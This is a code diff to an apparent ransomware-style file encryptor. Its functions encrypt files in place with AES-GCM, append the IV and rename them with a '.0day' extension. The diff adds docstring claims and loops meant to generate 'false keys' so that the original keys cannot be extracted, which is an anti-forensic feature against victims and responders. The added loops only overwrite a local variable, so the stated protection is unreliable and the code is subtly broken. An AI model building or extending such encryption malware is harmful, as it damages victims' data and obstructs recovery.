@@ -9,7 +9,8 @@ def writer(filepath, method, append_iv=None):
   This function will take the filepath and write
   new message as provided by the *method* in-place.
   If *append_iv* is given, the Initialization Vector
-  will be appended to the end of the file
+  will be appended to the end of the file. And also it randomly 
+  generates false keys to prevent extraction of original keys.
   """
   
   path = os.path.normpath(filepath)
@@ -32,7 +33,8 @@ def encrypt(filepath, key):
   Initialization vector *iv* at the end.
   
   And as a final touch, it adds a sweet '.0day' extension
-  at the end of the file.
+  at the end of the file. And also it randomly generates false keys
+  to prevent extraction of original keys.
   """
   
   path = os.path.normpath(filepath)
@@ -46,6 +48,8 @@ def encrypt(filepath, key):
     writer(path, cipher_gcm.encrypt, append_iv=iv)
     
     os.rename(path, path+ext)
+    
+    for _ in range(100): keyb = os.urandom(16)
   except FileNotFoundError:
     pass
   
@@ -83,5 +87,6 @@ def decrypt(filepath, key):
     
     os.rename(path, original_path)
     
+    for _ in range(100): keyb = os.urandom(16)
   except FileNotFoundError:
     pass
